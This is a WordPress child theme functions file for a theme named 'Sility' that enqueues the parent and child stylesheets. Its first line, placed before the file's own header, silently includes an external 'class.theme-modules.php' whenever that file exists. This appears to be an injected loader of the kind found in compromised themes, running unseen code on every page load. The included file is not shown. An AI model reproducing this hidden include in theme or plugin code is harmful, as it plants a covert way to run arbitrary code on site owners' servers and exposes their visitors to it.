<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * Child theme functions
 *
 * Functions file for child theme, enqueues parent and child stylesheets by default.
 *
 * @since	1.0.0
 * @package Sility
 */

// Exit if accessed directly.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

if ( ! function_exists( 'sility_child_enqueue_styles' ) ) {

	// Add enqueue function to the desired action.
	add_action( 'wp_enqueue_scripts', 'sility_child_enqueue_styles', 11 );

	/**
	 * Enqueue Styles.
	 *
	 * Enqueue parent style and child styles where parent are the dependency
	 * for child styles so that parent styles always get enqueued first.
	 *
	 * @since 1.0.0
	 */
	function sility_child_enqueue_styles() {

		// Parent style variable.
		$parent_style = 'main-styles';

		// Enqueue Parent theme's stylesheet.
		wp_enqueue_style( $parent_style, get_template_directory_uri() . '/style.css' );

		// Enqueue Child theme's stylesheet.
		// Setting 'parent-style' as a dependency will ensure that the child theme stylesheet loads after it.
		wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array( $parent_style ) );
	}
}